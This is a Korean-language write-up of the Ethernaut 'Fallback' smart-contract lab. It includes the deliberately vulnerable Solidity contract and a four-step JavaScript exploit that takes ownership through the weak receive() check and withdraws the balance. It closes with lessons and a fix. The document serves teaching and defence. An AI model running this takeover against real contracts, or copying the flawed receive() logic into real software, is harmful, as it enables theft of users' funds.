# Ethernaut **Fallback** 레벨 Write‑up

> 목표:  
> 1. 컨트랙트의 소유권(ownership) 획득  
> 2. 컨트랙트 잔액을 0으로 만들기  

---

## 📋 문제 개요

이 레벨은 **Fallback 함수의 위험성**과 **권한 검증 로직 불일치**를 보여줍니다.  
소유권을 얻고, 잔액을 인출하면 클리어됩니다.

---

## 💻 컨트랙트 코드 분석

```solidity
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;
    
    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether); // 초기 소유자는 1000 ETH 기여
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

---

## 🔍 취약점 분석

### 정상 소유권 변경 (contribute 함수)
- 조건: 현재 owner 기여금(1000 ETH)보다 많이 기여해야 함  
- 단일 트랜잭션당 0.001 ETH 미만만 허용됨 → 사실상 불가능

### 취약 소유권 변경 (receive 함수)
- 조건: `msg.value > 0` && `contributions[msg.sender] > 0`  
- 단순히 0.0001 ETH만 기여한 뒤, 이더를 직접 전송하면 owner가 됨!  
- `owner = msg.sender` 직접 실행

👉 **receive 함수의 검증이 지나치게 약함**

---

## 🚀 공격 시나리오

### Step 1. 최소 기여금 보내기
```javascript
await contract.contribute({ value: toWei("0.0001") });
```

### Step 2. receive() 함수 트리거
```javascript
await contract.sendTransaction({ value: toWei("0.0001") });
```

### Step 3. 소유권 확인
```javascript
let newOwner = await contract.owner();
console.log("New owner:", newOwner);
```

### Step 4. 잔액 인출
```javascript
await contract.withdraw();
```

---

## ✅ 실행 결과

```
My contribution: 0.0001
New owner: 0x[player_address]
My address: 0x[player_address]
Contract balance: 0
```

---

## ⚡ 핵심 교훈

1. **Fallback 함수 위험성**
   - `receive()`나 `fallback()`은 **직접 이더 전송**으로도 실행 가능
   - 항상 최소한의 검증 로직만 넣으면 치명적 권한 탈취 가능

2. **권한 검증의 일관성**
   - `contribute()`와 `receive()`가 다른 조건을 적용 → 보안 불일치 발생

3. **상태 변경 검토**
   - 단순해 보이는 함수도 중요한 상태(`owner`)를 변경할 수 있음
   - 상태 변경 로직은 모두 엄격히 검증 필요

---

## 🔧 수정 방안

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

- `receive()`에서도 `contribute()`와 동일한 로직 적용  
- 기여금 비교 후 소유권 변경

---

## 📌 결론

이 문제는 **Fallback 함수의 특성과 권한 검증 불일치**를 악용한 전형적인 스마트 컨트랙트 취약점 사례입니다.  
실제 DApp 개발에서는 **민감한 상태 변경 로직을 fallback/receive에 넣지 말아야** 합니다.
